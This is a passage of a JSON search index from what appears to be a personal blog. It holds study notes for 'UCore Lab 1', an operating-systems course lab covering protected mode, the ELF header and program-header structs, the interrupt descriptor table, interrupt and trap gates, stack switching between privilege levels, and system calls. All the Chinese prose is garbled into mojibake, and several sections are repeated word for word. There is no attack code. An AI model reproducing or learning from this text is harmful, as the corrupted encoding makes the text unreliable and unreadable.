0ç½®1ï¼Œåˆ™ä»£è¡¨CPUè¿›å…¥ä¿æŠ¤æ¨¡å¼ã€‚æ®µæœºåˆ¶ï¼Œæ˜¯åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹è‡ªåŠ¨ä½¿èƒ½çš„ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ä¿æŠ¤æ¨¡å¼ä½¿èƒ½"},{"categories":["Pwning"],"content":"åŠ è½½ELFæ ¼å¼çš„uCore kernelè¿™é‡Œä¸æ˜¯æ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰ä¸ºkernelè¿›è¡Œç¼–å†™ã€‚ ELFæ–‡ä»¶æ ¼å¼æ¦‚è¿°ELF(Executable and linking format)æ–‡ä»¶æ ¼å¼æ˜¯Linuxç³»ç»Ÿä¸‹çš„ä¸€ç§å¸¸ç”¨ç›®æ ‡æ–‡ä»¶(object file)æ ¼å¼ï¼Œæœ‰ä¸‰ç§ä¸»è¦ç±»å‹: ç”¨äºæ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶(executable file)ï¼Œç”¨äºæä¾›ç¨‹åºçš„è¿›ç¨‹æ˜ åƒï¼ŒåŠ è½½çš„å†…å­˜æ‰§è¡Œã€‚ è¿™ä¹Ÿæ˜¯æœ¬å®éªŒçš„OSæ–‡ä»¶ç±»å‹ã€‚ ç”¨äºè¿æ¥çš„å¯é‡å®šä½æ–‡ä»¶(relocatable file)ï¼Œå¯ä¸å…¶å®ƒç›®æ ‡æ–‡ä»¶ä¸€èµ·åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶ã€‚ å…±äº«ç›®æ ‡æ–‡ä»¶(shared object file)ï¼Œè¿æ¥å™¨å¯å°†å®ƒä¸å…¶å®ƒå¯é‡å®šä½æ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶è¿æ¥æˆå…¶å®ƒçš„ç›®æ ‡æ–‡ä»¶ï¼ŒåŠ¨æ€è¿æ¥å™¨åˆå¯å°†å®ƒä¸å¯æ‰§è¡Œæ–‡ä»¶å’Œå…¶å®ƒå…±äº«ç›®æ ‡æ–‡ä»¶ç»“åˆèµ·æ¥åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æ˜ åƒã€‚ è¿™é‡Œåªåˆ†æä¸æœ¬å®éªŒç›¸å…³çš„ELFå¯æ‰§è¡Œæ–‡ä»¶ç±»å‹ã€‚ELF headeråœ¨æ–‡ä»¶å¼€å§‹å¤„æè¿°äº†æ•´ä¸ªæ–‡ä»¶çš„ç»„ç»‡ã€‚ELFçš„æ–‡ä»¶å¤´åŒ…å«æ•´ä¸ªæ‰§è¡Œæ–‡ä»¶çš„æ§åˆ¶ç»“æ„ï¼Œå…¶å®šä¹‰åœ¨elf.hä¸­ï¼š struct elfhdr { uint magic; // must equal ELF_MAGIC uchar elf[12]; ushort type; ushort machine; uint version; uint entry; // ç¨‹åºå…¥å£çš„è™šæ‹Ÿåœ°å€ uint phoff; // program header è¡¨çš„ä½ç½®åç§» uint shoff; uint flags; ushort ehsize; ushort phentsize; ushort phnum; //program headerè¡¨ä¸­çš„å…¥å£æ•°ç›® ushort shentsize; ushort shnum; ushort shstrndx; }; program headeræè¿°ä¸ç¨‹åºæ‰§è¡Œç›´æ¥ç›¸å…³çš„ç›®æ ‡æ–‡ä»¶ç»“æ„ä¿¡æ¯ï¼Œç”¨æ¥åœ¨æ–‡ä»¶ä¸­å®šä½å„ä¸ªæ®µçš„æ˜ åƒï¼ŒåŒæ—¶åŒ…å«å…¶ä»–ä¸€äº›ç”¨æ¥ä¸ºç¨‹åºåˆ›å»ºè¿›ç¨‹æ˜ åƒæ‰€å¿…éœ€çš„ä¿¡æ¯ã€‚ å¯æ‰§è¡Œæ–‡ä»¶çš„ç¨‹åºå¤´éƒ¨æ˜¯ä¸€ä¸ªprogram headerç»“æ„çš„æ•°ç»„ï¼Œ æ¯ä¸ªç»“æ„æè¿°äº†ä¸€ä¸ªæ®µæˆ–è€…ç³»ç»Ÿå‡†å¤‡ç¨‹åºæ‰§è¡Œæ‰€å¿…éœ€çš„å…¶å®ƒä¿¡æ¯ã€‚ç›®æ ‡æ–‡ä»¶çš„ â€œæ®µâ€ åŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ª â€œèŠ‚åŒºâ€ï¼ˆsectionï¼‰ ï¼Œä¹Ÿå°±æ˜¯â€œæ®µå†…å®¹ï¼ˆSegment Contentsï¼‰â€ ã€‚ç¨‹åºå¤´éƒ¨ä»…å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æœ‰æ„ä¹‰ã€‚å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶åœ¨ELFå¤´éƒ¨çš„e_phentsizeå’Œe_phnumæˆå‘˜ä¸­ç»™å‡ºå…¶è‡ªèº«ç¨‹åºå¤´éƒ¨çš„å¤§å°ã€‚ç¨‹åºå¤´éƒ¨çš„æ•°æ®ç»“æ„å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š struct proghdr { uint type; // æ®µç±»å‹ uint offset; // æ®µç›¸å¯¹æ–‡ä»¶å¤´çš„åç§»å€¼ uint va; // æ®µçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å°†è¢«æ”¾åˆ°å†…å­˜ä¸­çš„è™šæ‹Ÿåœ°å€ uint pa; uint filesz; uint memsz; // æ®µåœ¨å†…å­˜æ˜ åƒä¸­å ç”¨çš„å­—èŠ‚æ•° uint flags; uint align; }; æ ¹æ®elfhdrå’Œproghdrçš„ç»“æ„æè¿°ï¼Œbootloaderå°±å¯ä»¥å®Œæˆå¯¹ELFæ ¼å¼çš„ucoreæ“ä½œç³»ç»Ÿçš„åŠ è½½è¿‡ç¨‹ï¼ˆå‚è§boot/bootmain.cä¸­çš„bootmainå‡½æ•°ï¼‰ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#åŠ è½½elfæ ¼å¼çš„ucore-kernel"},{"categories":["Pwning"],"content":"åŠ è½½ELFæ ¼å¼çš„uCore kernelè¿™é‡Œä¸æ˜¯æ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰ä¸ºkernelè¿›è¡Œç¼–å†™ã€‚ ELFæ–‡ä»¶æ ¼å¼æ¦‚è¿°ELF(Executable and linking format)æ–‡ä»¶æ ¼å¼æ˜¯Linuxç³»ç»Ÿä¸‹çš„ä¸€ç§å¸¸ç”¨ç›®æ ‡æ–‡ä»¶(object file)æ ¼å¼ï¼Œæœ‰ä¸‰ç§ä¸»è¦ç±»å‹: ç”¨äºæ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶(executable file)ï¼Œç”¨äºæä¾›ç¨‹åºçš„è¿›ç¨‹æ˜ åƒï¼ŒåŠ è½½çš„å†…å­˜æ‰§è¡Œã€‚ è¿™ä¹Ÿæ˜¯æœ¬å®éªŒçš„OSæ–‡ä»¶ç±»å‹ã€‚ ç”¨äºè¿æ¥çš„å¯é‡å®šä½æ–‡ä»¶(relocatable file)ï¼Œå¯ä¸å…¶å®ƒç›®æ ‡æ–‡ä»¶ä¸€èµ·åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶ã€‚ å…±äº«ç›®æ ‡æ–‡ä»¶(shared object file)ï¼Œè¿æ¥å™¨å¯å°†å®ƒä¸å…¶å®ƒå¯é‡å®šä½æ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶è¿æ¥æˆå…¶å®ƒçš„ç›®æ ‡æ–‡ä»¶ï¼ŒåŠ¨æ€è¿æ¥å™¨åˆå¯å°†å®ƒä¸å¯æ‰§è¡Œæ–‡ä»¶å’Œå…¶å®ƒå…±äº«ç›®æ ‡æ–‡ä»¶ç»“åˆèµ·æ¥åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æ˜ åƒã€‚ è¿™é‡Œåªåˆ†æä¸æœ¬å®éªŒç›¸å…³çš„ELFå¯æ‰§è¡Œæ–‡ä»¶ç±»å‹ã€‚ELF headeråœ¨æ–‡ä»¶å¼€å§‹å¤„æè¿°äº†æ•´ä¸ªæ–‡ä»¶çš„ç»„ç»‡ã€‚ELFçš„æ–‡ä»¶å¤´åŒ…å«æ•´ä¸ªæ‰§è¡Œæ–‡ä»¶çš„æ§åˆ¶ç»“æ„ï¼Œå…¶å®šä¹‰åœ¨elf.hä¸­ï¼š struct elfhdr { uint magic; // must equal ELF_MAGIC uchar elf[12]; ushort type; ushort machine; uint version; uint entry; // ç¨‹åºå…¥å£çš„è™šæ‹Ÿåœ°å€ uint phoff; // program header è¡¨çš„ä½ç½®åç§» uint shoff; uint flags; ushort ehsize; ushort phentsize; ushort phnum; //program headerè¡¨ä¸­çš„å…¥å£æ•°ç›® ushort shentsize; ushort shnum; ushort shstrndx; }; program headeræè¿°ä¸ç¨‹åºæ‰§è¡Œç›´æ¥ç›¸å…³çš„ç›®æ ‡æ–‡ä»¶ç»“æ„ä¿¡æ¯ï¼Œç”¨æ¥åœ¨æ–‡ä»¶ä¸­å®šä½å„ä¸ªæ®µçš„æ˜ åƒï¼ŒåŒæ—¶åŒ…å«å…¶ä»–ä¸€äº›ç”¨æ¥ä¸ºç¨‹åºåˆ›å»ºè¿›ç¨‹æ˜ åƒæ‰€å¿…éœ€çš„ä¿¡æ¯ã€‚ å¯æ‰§è¡Œæ–‡ä»¶çš„ç¨‹åºå¤´éƒ¨æ˜¯ä¸€ä¸ªprogram headerç»“æ„çš„æ•°ç»„ï¼Œ æ¯ä¸ªç»“æ„æè¿°äº†ä¸€ä¸ªæ®µæˆ–è€…ç³»ç»Ÿå‡†å¤‡ç¨‹åºæ‰§è¡Œæ‰€å¿…éœ€çš„å…¶å®ƒä¿¡æ¯ã€‚ç›®æ ‡æ–‡ä»¶çš„ â€œæ®µâ€ åŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ª â€œèŠ‚åŒºâ€ï¼ˆsectionï¼‰ ï¼Œä¹Ÿå°±æ˜¯â€œæ®µå†…å®¹ï¼ˆSegment Contentsï¼‰â€ ã€‚ç¨‹åºå¤´éƒ¨ä»…å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æœ‰æ„ä¹‰ã€‚å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶åœ¨ELFå¤´éƒ¨çš„e_phentsizeå’Œe_phnumæˆå‘˜ä¸­ç»™å‡ºå…¶è‡ªèº«ç¨‹åºå¤´éƒ¨çš„å¤§å°ã€‚ç¨‹åºå¤´éƒ¨çš„æ•°æ®ç»“æ„å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š struct proghdr { uint type; // æ®µç±»å‹ uint offset; // æ®µç›¸å¯¹æ–‡ä»¶å¤´çš„åç§»å€¼ uint va; // æ®µçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å°†è¢«æ”¾åˆ°å†…å­˜ä¸­çš„è™šæ‹Ÿåœ°å€ uint pa; uint filesz; uint memsz; // æ®µåœ¨å†…å­˜æ˜ åƒä¸­å ç”¨çš„å­—èŠ‚æ•° uint flags; uint align; }; æ ¹æ®elfhdrå’Œproghdrçš„ç»“æ„æè¿°ï¼Œbootloaderå°±å¯ä»¥å®Œæˆå¯¹ELFæ ¼å¼çš„ucoreæ“ä½œç³»ç»Ÿçš„åŠ è½½è¿‡ç¨‹ï¼ˆå‚è§boot/bootmain.cä¸­çš„bootmainå‡½æ•°ï¼‰ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#elfæ–‡ä»¶æ ¼å¼æ¦‚è¿°"},{"categories":["Pwning"],"content":"ä¸­æ–­ã€å¼‚å¸¸å’Œç³»ç»Ÿè°ƒç”¨ä¸ºä»€ä¹ˆéœ€è¦ä¸­æ–­ã€å¼‚å¸¸å’Œç³»ç»Ÿè°ƒç”¨ï¼Ÿ åœ¨è®¡ç®—æœºè¿è¡Œä¸­ï¼Œå†…æ ¸æ˜¯è¢«ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ åªæœ‰å†…æ ¸å¯ä»¥æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ æ–¹ä¾¿åº”ç”¨ç¨‹åº ä¸­æ–­å’Œå¼‚å¸¸å¸Œæœ›è§£å†³ï¼Œå¤–è®¾è¿æ¥è®¡ç®—æœºæ—¶çš„åŠ è½½é—®é¢˜å’Œåº”å¯¹ç¨‹åºçš„æ„å¤–è¡Œä¸ºã€‚å¦‚ï¼Œå½“è®¡ç®—æœºå¸Œæœ›ä½ æŒ‰å›è½¦é”®æ—¶ï¼ŒæŒ‰ä¸‹é”®ç›˜çš„æ—¶é—´æ˜¯ä¸ç¡®å®šçš„ï¼Œè®¡ç®—æœºä¸èƒ½æ°¸è¿œç­‰å¾…ã€‚ ç³»ç»Ÿè°ƒç”¨å¸Œæœ›è§£å†³ç”¨æˆ·ä½¿ç”¨å†…æ ¸æœåŠ¡æ—¶ï¼Œä¸ä¼šå¯¹å†…æ ¸é€ æˆå¨èƒçš„é—®é¢˜ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ä¸­æ–­å¼‚å¸¸å’Œç³»ç»Ÿè°ƒç”¨"},{"categories":["Pwning"],"content":"ä¸­æ–­","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ä¸­æ–­"},{"categories":["Pwning"],"content":"BIOSä¸­æ–­ã€DOSä¸­æ–­ã€Linuxä¸­æ–­çš„åŒºåˆ« BIOSå’ŒDOSéƒ½å­˜åœ¨äºå®æ¨¡å¼ä¸‹ï¼Œç”±å®ƒä»¬å»ºç«‹çš„ä¸­æ–­è°ƒç”¨éƒ½æ˜¯å»ºç«‹åœ¨ä¸­æ–­å‘é‡è¡¨ï¼ˆInterrupt Vector Tableï¼ŒIVTï¼‰ä¸­çš„ï¼Œéƒ½æ˜¯é€šè¿‡è½¯ä¸­æ–­æŒ‡ä»¤ int ä¸­æ–­å·æ¥è°ƒç”¨ã€‚ BIOS ä¸­æ–­è°ƒç”¨çš„ä¸»è¦åŠŸèƒ½æ˜¯æä¾›äº†ç¡¬ä»¶è®¿é—®çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä½¿å¯¹ç¡¬ä»¶çš„æ“ä½œå˜å¾—ç®€å•æ˜“è¡Œã€‚ DOS æ˜¯è¿è¡Œåœ¨å®æ¨¡å¼ä¸‹çš„ï¼Œæ•…å…¶å»ºç«‹çš„ä¸­æ–­è°ƒç”¨ä¹Ÿå»ºç«‹åœ¨ä¸­æ–­å‘é‡è¡¨ä¸­ï¼Œåªä¸è¿‡å…¶ä¸­æ–­å‘é‡å·å’ŒBIOSçš„ä¸èƒ½å†²çªã€‚ Linux å†…æ ¸æ˜¯åœ¨è¿›å…¥ä¿æŠ¤æ¨¡å¼åæ‰å»ºç«‹ä¸­æ–­ä¾‹ç¨‹çš„ï¼Œä¸è¿‡åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œä¸­æ–­å‘é‡è¡¨å·²ç»ä¸å­˜åœ¨äº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆInterrupt Descriptor Tableï¼ŒIDTï¼‰ã€‚Linux çš„ç³»ç»Ÿè°ƒç”¨å’ŒDOSä¸­æ–­è°ƒç”¨ç±»ä¼¼ï¼Œä¸è¿‡Linuxæ˜¯é€šè¿‡int 0x80æŒ‡ä»¤è¿›å…¥ä¸€ä¸ªä¸­æ–­ç¨‹åºåå†æ ¹æ®eaxå¯„å­˜å™¨çš„å€¼æ¥è°ƒç”¨ä¸åŒçš„å­åŠŸèƒ½å‡½æ•°çš„ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#biosä¸­æ–­dosä¸­æ–­linuxä¸­æ–­çš„åŒºåˆ«"},{"categories":["Pwning"],"content":"ä¸­æ–­æè¿°ç¬¦è¡¨ ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆInterrupt Descriptor Table, IDTï¼‰æŠŠæ¯ä¸ªä¸­æ–­æˆ–å¼‚å¸¸ç¼–å·å’Œä¸€ä¸ªæŒ‡å‘ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„æè¿°ç¬¦è”ç³»èµ·æ¥ã€‚åŒGDTä¸€æ ·ï¼ŒIDTæ˜¯ä¸€ä¸ª8å­—èŠ‚çš„æè¿°ç¬¦æ•°ç»„ï¼Œä½†IDTçš„ç¬¬ä¸€é¡¹å¯ä»¥åŒ…å«ä¸€ä¸ªæè¿°ç¬¦ã€‚ IDTå¯ä»¥ä½äºå†…å­˜çš„ä»»æ„ä½ç½®ï¼ŒCPUé€šè¿‡IDTå¯„å­˜å™¨ï¼ˆIDTRï¼‰çš„å†…å®¹æ¥å¯»å€IDTçš„èµ·å§‹åœ°å€ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ä¸­æ–­æè¿°ç¬¦è¡¨"},{"categories":["Pwning"],"content":"IDT gate descriptors ä¸­æ–­/å¼‚å¸¸åº”è¯¥ä½¿ç”¨Interrupt Gateæˆ–Trap Gateã€‚å…¶ä¸­çš„å”¯ä¸€åŒºåˆ«å°±æ˜¯ï¼šå½“è°ƒç”¨Interrupt Gateæ—¶ï¼ŒInterruptä¼šè¢«CPUè‡ªåŠ¨ç¦æ­¢ï¼›è€Œè°ƒç”¨Trap Gateæ—¶ï¼ŒCPUåˆ™ä¸ä¼šå»ç¦æ­¢æˆ–æ‰“å¼€ä¸­æ–­ï¼Œè€Œæ˜¯ä¿ç•™åŸæ ·ã€‚ è¿™å…¶ä¸­çš„åŸç†æ˜¯å½“CPUè·³è½¬è‡³Interrupt Gateæ—¶ï¼Œå…¶eflagä¸Šçš„IFä½ä¼šè¢«æ¸…é™¤ã€‚è€ŒTrap Gateåˆ™ä¸æ”¹å˜ã€‚ IDTä¸­åŒ…å«äº†3ç§ç±»å‹çš„Descriptor Task-gate descriptor Interrupt-gate descriptor ï¼ˆä¸­æ–­æ–¹å¼ç”¨åˆ°ï¼‰ Trap-gate descriptorï¼ˆç³»ç»Ÿè°ƒç”¨ç”¨åˆ°ï¼‰ ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:3","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#idt-gate-descriptors"},{"categories":["Pwning"],"content":"ä¸­æ–­çš„å¤„ç†æµç¨‹ äº§ç”Ÿä¸­æ–­åï¼Œä¼šé€šè¿‡å…¶ä¸­æ–­å·ï¼ŒæŸ¥æ‰¾å…¶ISRåœ¨IDTçš„å“ªä¸€é¡¹ã€‚ æ‰¾åˆ°å“åº”çš„Interrupt Gateæˆ–Trap Gateï¼Œå–å‡ºæ®µé€‰æ‹©å­ æ ¹æ®æ®µé€‰æ‹©å­æŸ¥æ‰¾GDTï¼Œå¾—åˆ°åŸºåœ°å€ åŸºåœ°å€+åç§»å¾—åˆ°ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„åœ°å€ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:4","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ä¸­æ–­çš„å¤„ç†æµç¨‹"},{"categories":["Pwning"],"content":"ä¸åŒç‰¹æƒçº§çš„ä¸­æ–­åˆ‡æ¢å¯¹å †æ ˆçš„å½±å“å †æ ˆçš„ä¸åŒç‰¹æƒçº§è®°å½•åœ¨æ®µæè¿°ç¬¦ä¸­ã€‚å¦‚æœä½ä¸¤ä½ä¸º0ï¼Œåˆ™è¿è¡Œä¸ºå†…æ ¸æ€ï¼Œè‹¥ä¸º3ï¼Œåˆ™è¿è¡Œåœ¨ç”¨æˆ·æ€ã€‚ åœ¨ç”¨æˆ·æ€äº§ç”Ÿçš„ä¸­æ–­ä¼šè¿›å…¥å†…æ ¸æ€è¿›è¡Œå¤„ç†ï¼Œè€Œåœ¨å†…æ ¸æ€äº§ç”Ÿçš„ä¸­æ–­è¿˜æ˜¯åœ¨å†…æ ¸æ€ã€‚è¿™æ˜¯ä¸¤ç§ä¸åŒçš„å¤„ç†æ–¹å¼ï¼Œå› ä¸ºå…¶ä¸­äº§ç”Ÿäº†ç‰¹æƒçº§çš„å˜åŒ–ã€‚ å†…æ ¸æ€ä¸­æ–­ æ ˆæ²¡æœ‰å˜æ¢ å¦‚æœäº§ç”Ÿçš„æ˜¯å¼‚å¸¸ï¼Œå‹å…¥Error code å‹å…¥cså’Œeipï¼Œå³å‹å…¥pcå€¼ å‹å…¥æ ‡å¿—å¯„å­˜å™¨çš„å€¼ é€šè¿‡iretè¿”å›ï¼Œä¼šå¼¹å‡ºEFLAGSå’ŒSS/EIPï¼ˆæ ¹æ®æ˜¯å¦æ”¹å˜ç‰¹æƒçº§ï¼‰ ç”¨æˆ·æ€ä¸­æ–­ åˆ‡æ¢åˆ°å†…æ ¸å †æ ˆ åœ¨å†…æ ¸ä¸­æ–­çš„åŸºç¡€ä¸Šé¢å¤–å‹å…¥ç”¨æˆ·æ ˆçš„sså’Œespï¼Œä¿å­˜ç”¨æˆ·æ€çš„æ ˆä¿¡æ¯ é€šè¿‡retæˆ–retfè¿”å›ï¼Œä»…å¼¹å‡ºEIPï¼Œretfå¼¹å‡ºCSå’ŒEIP ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:5","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ä¸åŒç‰¹æƒçº§çš„ä¸­æ–­åˆ‡æ¢å¯¹å †æ ˆçš„å½±å“"},{"categories":["Pwning"],"content":"ä¸åŒç‰¹æƒçº§çš„ä¸­æ–­åˆ‡æ¢å¯¹å †æ ˆçš„å½±å“å †æ ˆçš„ä¸åŒç‰¹æƒçº§è®°å½•åœ¨æ®µæè¿°ç¬¦ä¸­ã€‚å¦‚æœä½ä¸¤ä½ä¸º0ï¼Œåˆ™è¿è¡Œä¸ºå†…æ ¸æ€ï¼Œè‹¥ä¸º3ï¼Œåˆ™è¿è¡Œåœ¨ç”¨æˆ·æ€ã€‚ åœ¨ç”¨æˆ·æ€äº§ç”Ÿçš„ä¸­æ–­ä¼šè¿›å…¥å†…æ ¸æ€è¿›è¡Œå¤„ç†ï¼Œè€Œåœ¨å†…æ ¸æ€äº§ç”Ÿçš„ä¸­æ–­è¿˜æ˜¯åœ¨å†…æ ¸æ€ã€‚è¿™æ˜¯ä¸¤ç§ä¸åŒçš„å¤„ç†æ–¹å¼ï¼Œå› ä¸ºå…¶ä¸­äº§ç”Ÿäº†ç‰¹æƒçº§çš„å˜åŒ–ã€‚ å†…æ ¸æ€ä¸­æ–­ æ ˆæ²¡æœ‰å˜æ¢ å¦‚æœäº§ç”Ÿçš„æ˜¯å¼‚å¸¸ï¼Œå‹å…¥Error code å‹å…¥cså’Œeipï¼Œå³å‹å…¥pcå€¼ å‹å…¥æ ‡å¿—å¯„å­˜å™¨çš„å€¼ é€šè¿‡iretè¿”å›ï¼Œä¼šå¼¹å‡ºEFLAGSå’ŒSS/EIPï¼ˆæ ¹æ®æ˜¯å¦æ”¹å˜ç‰¹æƒçº§ï¼‰ ç”¨æˆ·æ€ä¸­æ–­ åˆ‡æ¢åˆ°å†…æ ¸å †æ ˆ åœ¨å†…æ ¸ä¸­æ–­çš„åŸºç¡€ä¸Šé¢å¤–å‹å…¥ç”¨æˆ·æ ˆçš„sså’Œespï¼Œä¿å­˜ç”¨æˆ·æ€çš„æ ˆä¿¡æ¯ é€šè¿‡retæˆ–retfè¿”å›ï¼Œä»…å¼¹å‡ºEIPï¼Œretfå¼¹å‡ºCSå’ŒEIP ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:5","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#å†…æ ¸æ€ä¸­æ–­"},{"categories":["Pwning"],"content":"ä¸åŒç‰¹æƒçº§çš„ä¸­æ–­åˆ‡æ¢å¯¹å †æ ˆçš„å½±å“å †æ ˆçš„ä¸åŒç‰¹æƒçº§è®°å½•åœ¨æ®µæè¿°ç¬¦ä¸­ã€‚å¦‚æœä½ä¸¤ä½ä¸º0ï¼Œåˆ™è¿è¡Œä¸ºå†…æ ¸æ€ï¼Œè‹¥ä¸º3ï¼Œåˆ™è¿è¡Œåœ¨ç”¨æˆ·æ€ã€‚ åœ¨ç”¨æˆ·æ€äº§ç”Ÿçš„ä¸­æ–­ä¼šè¿›å…¥å†…æ ¸æ€è¿›è¡Œå¤„ç†ï¼Œè€Œåœ¨å†…æ ¸æ€äº§ç”Ÿçš„ä¸­æ–­è¿˜æ˜¯åœ¨å†…æ ¸æ€ã€‚è¿™æ˜¯ä¸¤ç§ä¸åŒçš„å¤„ç†æ–¹å¼ï¼Œå› ä¸ºå…¶ä¸­äº§ç”Ÿäº†ç‰¹æƒçº§çš„å˜åŒ–ã€‚ å†…æ ¸æ€ä¸­æ–­ æ ˆæ²¡æœ‰å˜æ¢ å¦‚æœäº§ç”Ÿçš„æ˜¯å¼‚å¸¸ï¼Œå‹å…¥Error code å‹å…¥cså’Œeipï¼Œå³å‹å…¥pcå€¼ å‹å…¥æ ‡å¿—å¯„å­˜å™¨çš„å€¼ é€šè¿‡iretè¿”å›ï¼Œä¼šå¼¹å‡ºEFLAGSå’ŒSS/EIPï¼ˆæ ¹æ®æ˜¯å¦æ”¹å˜ç‰¹æƒçº§ï¼‰ ç”¨æˆ·æ€ä¸­æ–­ åˆ‡æ¢åˆ°å†…æ ¸å †æ ˆ åœ¨å†…æ ¸ä¸­æ–­çš„åŸºç¡€ä¸Šé¢å¤–å‹å…¥ç”¨æˆ·æ ˆçš„sså’Œespï¼Œä¿å­˜ç”¨æˆ·æ€çš„æ ˆä¿¡æ¯ é€šè¿‡retæˆ–retfè¿”å›ï¼Œä»…å¼¹å‡ºEIPï¼Œretfå¼¹å‡ºCSå’ŒEIP ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:5","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç”¨æˆ·æ€ä¸­æ–­"},{"categories":["Pwning"],"content":"å¼‚å¸¸ä¸€èˆ¬æºäºç¨‹åºçš„é”™è¯¯æ‰§è¡Œï¼Œæˆ–éæ³•è®¿é—®ã€‚ å¼‚å¸¸å¤„ç†çš„ä¾‹ç¨‹ä¹Ÿå¤šæ•°åªä¼šä¸­æ­¢ç¨‹åºçš„æ‰§è¡Œã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#å¼‚å¸¸"},{"categories":["Pwning"],"content":"ç³»ç»Ÿè°ƒç”¨ç³»ç»Ÿè°ƒç”¨ä¹Ÿæ˜¯ç‰¹æ®Šçš„ä¸­æ–­ï¼Œé€šè¿‡Trap Gateè¿›å…¥ï¼Œæ‰€ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸æ€ä¹Ÿç§°ä¸ºé™·å…¥å†…æ ¸ã€‚ ä¸€ä¸ªä¾‹å­ï¼šåœ¨è°ƒç”¨printfæ—¶ï¼Œä¼šè§¦å‘ç³»ç»Ÿè°ƒç”¨writeã€‚ æ“ä½œç³»ç»Ÿçš„æœåŠ¡çš„ç¼–ç¨‹æ¥å£ é€šå¸¸ç”±é«˜çº§è¯­è¨€ç¼–å†™ï¼ˆC/C++ï¼‰ é€šå¸¸é€šè¿‡æ›´é«˜å±‚æ¬¡çš„APIå°è£…è€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç³»ç»Ÿè°ƒç”¨"},{"categories":["Pwning"],"content":"å®ç° æ¯ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹åº”ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å· ç³»ç»Ÿè°ƒç”¨æ¥å£æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·æ¥ç»´æŠ¤è¡¨çš„ç´¢å¼• ç³»ç»Ÿè°ƒç”¨æ¥å£è°ƒç”¨å†…æ ¸æ€ä¸­çš„ç³»ç»Ÿè°ƒç”¨åŠŸèƒ½å®ç°ï¼Œå¹¶è¿”å›ç³»ç»Ÿè°ƒç”¨çš„çŠ¶æ€å’Œç»“æœ ç”¨æˆ·ä¸éœ€è¦çŸ¥é“ï¼Œç³»ç»Ÿè°ƒç”¨çš„å®ç°ï¼Œåªéœ€è®¾ç½®å‚æ•°è·å–è¿”å›ç»“æœã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:1","series":null,"tags":["Pwn"],"title":"UCore Lab 